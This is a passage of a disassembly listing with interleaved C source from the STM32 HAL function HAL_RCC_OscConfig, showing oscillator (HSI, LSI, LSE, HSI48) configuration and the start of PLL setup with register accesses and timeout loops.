 8003c2c:	687b      	ldr	r3, [r7, #4]
 8003c2e:	68db      	ldr	r3, [r3, #12]
 8003c30:	2b00      	cmp	r3, #0
 8003c32:	d101      	bne.n	8003c38 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003c34:	2301      	movs	r3, #1
 8003c36:	e277      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c38:	4b76      	ldr	r3, [pc, #472]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c3a:	685b      	ldr	r3, [r3, #4]
 8003c3c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c40:	687b      	ldr	r3, [r7, #4]
 8003c42:	691b      	ldr	r3, [r3, #16]
 8003c44:	061b      	lsls	r3, r3, #24
 8003c46:	4973      	ldr	r1, [pc, #460]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c48:	4313      	orrs	r3, r2
 8003c4a:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003c4c:	e040      	b.n	8003cd0 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003c4e:	687b      	ldr	r3, [r7, #4]
 8003c50:	68db      	ldr	r3, [r3, #12]
 8003c52:	2b00      	cmp	r3, #0
 8003c54:	d023      	beq.n	8003c9e <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003c56:	4b6f      	ldr	r3, [pc, #444]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c58:	681b      	ldr	r3, [r3, #0]
 8003c5a:	4a6e      	ldr	r2, [pc, #440]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c5c:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003c60:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c62:	f7fd fad1 	bl	8001208 <HAL_GetTick>
 8003c66:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c68:	e008      	b.n	8003c7c <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c6a:	f7fd facd 	bl	8001208 <HAL_GetTick>
 8003c6e:	4602      	mov	r2, r0
 8003c70:	693b      	ldr	r3, [r7, #16]
 8003c72:	1ad3      	subs	r3, r2, r3
 8003c74:	2b02      	cmp	r3, #2
 8003c76:	d901      	bls.n	8003c7c <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003c78:	2303      	movs	r3, #3
 8003c7a:	e255      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c7c:	4b65      	ldr	r3, [pc, #404]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c7e:	681b      	ldr	r3, [r3, #0]
 8003c80:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c84:	2b00      	cmp	r3, #0
 8003c86:	d0f0      	beq.n	8003c6a <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c88:	4b62      	ldr	r3, [pc, #392]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c8a:	685b      	ldr	r3, [r3, #4]
 8003c8c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c90:	687b      	ldr	r3, [r7, #4]
 8003c92:	691b      	ldr	r3, [r3, #16]
 8003c94:	061b      	lsls	r3, r3, #24
 8003c96:	495f      	ldr	r1, [pc, #380]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c98:	4313      	orrs	r3, r2
 8003c9a:	604b      	str	r3, [r1, #4]
 8003c9c:	e018      	b.n	8003cd0 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003c9e:	4b5d      	ldr	r3, [pc, #372]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003ca0:	681b      	ldr	r3, [r3, #0]
 8003ca2:	4a5c      	ldr	r2, [pc, #368]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003ca4:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003ca8:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003caa:	f7fd faad 	bl	8001208 <HAL_GetTick>
 8003cae:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003cb0:	e008      	b.n	8003cc4 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003cb2:	f7fd faa9 	bl	8001208 <HAL_GetTick>
 8003cb6:	4602      	mov	r2, r0
 8003cb8:	693b      	ldr	r3, [r7, #16]
 8003cba:	1ad3      	subs	r3, r2, r3
 8003cbc:	2b02      	cmp	r3, #2
 8003cbe:	d901      	bls.n	8003cc4 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003cc0:	2303      	movs	r3, #3
 8003cc2:	e231      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003cc4:	4b53      	ldr	r3, [pc, #332]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003cc6:	681b      	ldr	r3, [r3, #0]
 8003cc8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003ccc:	2b00      	cmp	r3, #0
 8003cce:	d1f0      	bne.n	8003cb2 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003cd0:	687b      	ldr	r3, [r7, #4]
 8003cd2:	681b      	ldr	r3, [r3, #0]
 8003cd4:	f003 0308 	and.w	r3, r3, #8
 8003cd8:	2b00      	cmp	r3, #0
 8003cda:	d03c      	beq.n	8003d56 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003cdc:	687b      	ldr	r3, [r7, #4]
 8003cde:	695b      	ldr	r3, [r3, #20]
 8003ce0:	2b00      	cmp	r3, #0
 8003ce2:	d01c      	beq.n	8003d1e <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003ce4:	4b4b      	ldr	r3, [pc, #300]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003ce6:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cea:	4a4a      	ldr	r2, [pc, #296]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003cec:	f043 0301 	orr.w	r3, r3, #1
 8003cf0:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003cf4:	f7fd fa88 	bl	8001208 <HAL_GetTick>
 8003cf8:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003cfa:	e008      	b.n	8003d0e <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003cfc:	f7fd fa84 	bl	8001208 <HAL_GetTick>
 8003d00:	4602      	mov	r2, r0
 8003d02:	693b      	ldr	r3, [r7, #16]
 8003d04:	1ad3      	subs	r3, r2, r3
 8003d06:	2b02      	cmp	r3, #2
 8003d08:	d901      	bls.n	8003d0e <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003d0a:	2303      	movs	r3, #3
 8003d0c:	e20c      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003d0e:	4b41      	ldr	r3, [pc, #260]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d10:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003d14:	f003 0302 	and.w	r3, r3, #2
 8003d18:	2b00      	cmp	r3, #0
 8003d1a:	d0ef      	beq.n	8003cfc <HAL_RCC_OscConfig+0x3ec>
 8003d1c:	e01b      	b.n	8003d56 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003d1e:	4b3d      	ldr	r3, [pc, #244]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d20:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003d24:	4a3b      	ldr	r2, [pc, #236]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d26:	f023 0301 	bic.w	r3, r3, #1
 8003d2a:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003d2e:	f7fd fa6b 	bl	8001208 <HAL_GetTick>
 8003d32:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003d34:	e008      	b.n	8003d48 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003d36:	f7fd fa67 	bl	8001208 <HAL_GetTick>
 8003d3a:	4602      	mov	r2, r0
 8003d3c:	693b      	ldr	r3, [r7, #16]
 8003d3e:	1ad3      	subs	r3, r2, r3
 8003d40:	2b02      	cmp	r3, #2
 8003d42:	d901      	bls.n	8003d48 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003d44:	2303      	movs	r3, #3
 8003d46:	e1ef      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003d48:	4b32      	ldr	r3, [pc, #200]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d4a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003d4e:	f003 0302 	and.w	r3, r3, #2
 8003d52:	2b00      	cmp	r3, #0
 8003d54:	d1ef      	bne.n	8003d36 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003d56:	687b      	ldr	r3, [r7, #4]
 8003d58:	681b      	ldr	r3, [r3, #0]
 8003d5a:	f003 0304 	and.w	r3, r3, #4
 8003d5e:	2b00      	cmp	r3, #0
 8003d60:	f000 80a6 	beq.w	8003eb0 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003d64:	2300      	movs	r3, #0
 8003d66:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003d68:	4b2a      	ldr	r3, [pc, #168]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d6a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d6c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d70:	2b00      	cmp	r3, #0
 8003d72:	d10d      	bne.n	8003d90 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003d74:	4b27      	ldr	r3, [pc, #156]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d76:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d78:	4a26      	ldr	r2, [pc, #152]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d7a:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003d7e:	6593      	str	r3, [r2, #88]	; 0x58
 8003d80:	4b24      	ldr	r3, [pc, #144]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003d82:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d84:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d88:	60bb      	str	r3, [r7, #8]
 8003d8a:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003d8c:	2301      	movs	r3, #1
 8003d8e:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d90:	4b21      	ldr	r3, [pc, #132]	; (8003e18 <HAL_RCC_OscConfig+0x508>)
 8003d92:	681b      	ldr	r3, [r3, #0]
 8003d94:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d98:	2b00      	cmp	r3, #0
 8003d9a:	d118      	bne.n	8003dce <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003d9c:	4b1e      	ldr	r3, [pc, #120]	; (8003e18 <HAL_RCC_OscConfig+0x508>)
 8003d9e:	681b      	ldr	r3, [r3, #0]
 8003da0:	4a1d      	ldr	r2, [pc, #116]	; (8003e18 <HAL_RCC_OscConfig+0x508>)
 8003da2:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003da6:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003da8:	f7fd fa2e 	bl	8001208 <HAL_GetTick>
 8003dac:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003dae:	e008      	b.n	8003dc2 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003db0:	f7fd fa2a 	bl	8001208 <HAL_GetTick>
 8003db4:	4602      	mov	r2, r0
 8003db6:	693b      	ldr	r3, [r7, #16]
 8003db8:	1ad3      	subs	r3, r2, r3
 8003dba:	2b02      	cmp	r3, #2
 8003dbc:	d901      	bls.n	8003dc2 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003dbe:	2303      	movs	r3, #3
 8003dc0:	e1b2      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003dc2:	4b15      	ldr	r3, [pc, #84]	; (8003e18 <HAL_RCC_OscConfig+0x508>)
 8003dc4:	681b      	ldr	r3, [r3, #0]
 8003dc6:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003dca:	2b00      	cmp	r3, #0
 8003dcc:	d0f0      	beq.n	8003db0 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003dce:	687b      	ldr	r3, [r7, #4]
 8003dd0:	689b      	ldr	r3, [r3, #8]
 8003dd2:	2b01      	cmp	r3, #1
 8003dd4:	d108      	bne.n	8003de8 <HAL_RCC_OscConfig+0x4d8>
 8003dd6:	4b0f      	ldr	r3, [pc, #60]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003dd8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003ddc:	4a0d      	ldr	r2, [pc, #52]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003dde:	f043 0301 	orr.w	r3, r3, #1
 8003de2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003de6:	e029      	b.n	8003e3c <HAL_RCC_OscConfig+0x52c>
 8003de8:	687b      	ldr	r3, [r7, #4]
 8003dea:	689b      	ldr	r3, [r3, #8]
 8003dec:	2b05      	cmp	r3, #5
 8003dee:	d115      	bne.n	8003e1c <HAL_RCC_OscConfig+0x50c>
 8003df0:	4b08      	ldr	r3, [pc, #32]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003df2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003df6:	4a07      	ldr	r2, [pc, #28]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003df8:	f043 0304 	orr.w	r3, r3, #4
 8003dfc:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003e00:	4b04      	ldr	r3, [pc, #16]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003e02:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e06:	4a03      	ldr	r2, [pc, #12]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003e08:	f043 0301 	orr.w	r3, r3, #1
 8003e0c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003e10:	e014      	b.n	8003e3c <HAL_RCC_OscConfig+0x52c>
 8003e12:	bf00      	nop
 8003e14:	40021000 	.word	0x40021000
 8003e18:	40007000 	.word	0x40007000
 8003e1c:	4b9a      	ldr	r3, [pc, #616]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003e1e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e22:	4a99      	ldr	r2, [pc, #612]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003e24:	f023 0301 	bic.w	r3, r3, #1
 8003e28:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003e2c:	4b96      	ldr	r3, [pc, #600]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003e2e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e32:	4a95      	ldr	r2, [pc, #596]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003e34:	f023 0304 	bic.w	r3, r3, #4
 8003e38:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003e3c:	687b      	ldr	r3, [r7, #4]
 8003e3e:	689b      	ldr	r3, [r3, #8]
 8003e40:	2b00      	cmp	r3, #0
 8003e42:	d016      	beq.n	8003e72 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e44:	f7fd f9e0 	bl	8001208 <HAL_GetTick>
 8003e48:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003e4a:	e00a      	b.n	8003e62 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003e4c:	f7fd f9dc 	bl	8001208 <HAL_GetTick>
 8003e50:	4602      	mov	r2, r0
 8003e52:	693b      	ldr	r3, [r7, #16]
 8003e54:	1ad3      	subs	r3, r2, r3
 8003e56:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e5a:	4293      	cmp	r3, r2
 8003e5c:	d901      	bls.n	8003e62 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003e5e:	2303      	movs	r3, #3
 8003e60:	e162      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003e62:	4b89      	ldr	r3, [pc, #548]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003e64:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e68:	f003 0302 	and.w	r3, r3, #2
 8003e6c:	2b00      	cmp	r3, #0
 8003e6e:	d0ed      	beq.n	8003e4c <HAL_RCC_OscConfig+0x53c>
 8003e70:	e015      	b.n	8003e9e <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e72:	f7fd f9c9 	bl	8001208 <HAL_GetTick>
 8003e76:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e78:	e00a      	b.n	8003e90 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003e7a:	f7fd f9c5 	bl	8001208 <HAL_GetTick>
 8003e7e:	4602      	mov	r2, r0
 8003e80:	693b      	ldr	r3, [r7, #16]
 8003e82:	1ad3      	subs	r3, r2, r3
 8003e84:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e88:	4293      	cmp	r3, r2
 8003e8a:	d901      	bls.n	8003e90 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003e8c:	2303      	movs	r3, #3
 8003e8e:	e14b      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e90:	4b7d      	ldr	r3, [pc, #500]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003e92:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e96:	f003 0302 	and.w	r3, r3, #2
 8003e9a:	2b00      	cmp	r3, #0
 8003e9c:	d1ed      	bne.n	8003e7a <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003e9e:	7ffb      	ldrb	r3, [r7, #31]
 8003ea0:	2b01      	cmp	r3, #1
 8003ea2:	d105      	bne.n	8003eb0 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003ea4:	4b78      	ldr	r3, [pc, #480]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003ea6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ea8:	4a77      	ldr	r2, [pc, #476]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003eaa:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003eae:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003eb0:	687b      	ldr	r3, [r7, #4]
 8003eb2:	681b      	ldr	r3, [r3, #0]
 8003eb4:	f003 0320 	and.w	r3, r3, #32
 8003eb8:	2b00      	cmp	r3, #0
 8003eba:	d03c      	beq.n	8003f36 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003ebc:	687b      	ldr	r3, [r7, #4]
 8003ebe:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003ec0:	2b00      	cmp	r3, #0
 8003ec2:	d01c      	beq.n	8003efe <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003ec4:	4b70      	ldr	r3, [pc, #448]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003ec6:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003eca:	4a6f      	ldr	r2, [pc, #444]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003ecc:	f043 0301 	orr.w	r3, r3, #1
 8003ed0:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003ed4:	f7fd f998 	bl	8001208 <HAL_GetTick>
 8003ed8:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003eda:	e008      	b.n	8003eee <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003edc:	f7fd f994 	bl	8001208 <HAL_GetTick>
 8003ee0:	4602      	mov	r2, r0
 8003ee2:	693b      	ldr	r3, [r7, #16]
 8003ee4:	1ad3      	subs	r3, r2, r3
 8003ee6:	2b02      	cmp	r3, #2
 8003ee8:	d901      	bls.n	8003eee <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003eea:	2303      	movs	r3, #3
 8003eec:	e11c      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003eee:	4b66      	ldr	r3, [pc, #408]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003ef0:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ef4:	f003 0302 	and.w	r3, r3, #2
 8003ef8:	2b00      	cmp	r3, #0
 8003efa:	d0ef      	beq.n	8003edc <HAL_RCC_OscConfig+0x5cc>
 8003efc:	e01b      	b.n	8003f36 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003efe:	4b62      	ldr	r3, [pc, #392]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003f00:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003f04:	4a60      	ldr	r2, [pc, #384]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003f06:	f023 0301 	bic.w	r3, r3, #1
 8003f0a:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003f0e:	f7fd f97b 	bl	8001208 <HAL_GetTick>
 8003f12:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003f14:	e008      	b.n	8003f28 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003f16:	f7fd f977 	bl	8001208 <HAL_GetTick>
 8003f1a:	4602      	mov	r2, r0
 8003f1c:	693b      	ldr	r3, [r7, #16]
 8003f1e:	1ad3      	subs	r3, r2, r3
 8003f20:	2b02      	cmp	r3, #2
 8003f22:	d901      	bls.n	8003f28 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003f24:	2303      	movs	r3, #3
 8003f26:	e0ff      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003f28:	4b57      	ldr	r3, [pc, #348]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003f2a:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003f2e:	f003 0302 	and.w	r3, r3, #2
 8003f32:	2b00      	cmp	r3, #0
 8003f34:	d1ef      	bne.n	8003f16 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003f36:	687b      	ldr	r3, [r7, #4]
 8003f38:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003f3a:	2b00      	cmp	r3, #0
 8003f3c:	f000 80f3 	beq.w	8004126 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003f40:	687b      	ldr	r3, [r7, #4]
 8003f42:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003f44:	2b02      	cmp	r3, #2
 8003f46:	f040 80c9 	bne.w	80040dc <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003f4a:	4b4f      	ldr	r3, [pc, #316]	; (8004088 <HAL_RCC_OscConfig+0x778>)
 8003f4c:	68db      	ldr	r3, [r3, #12]
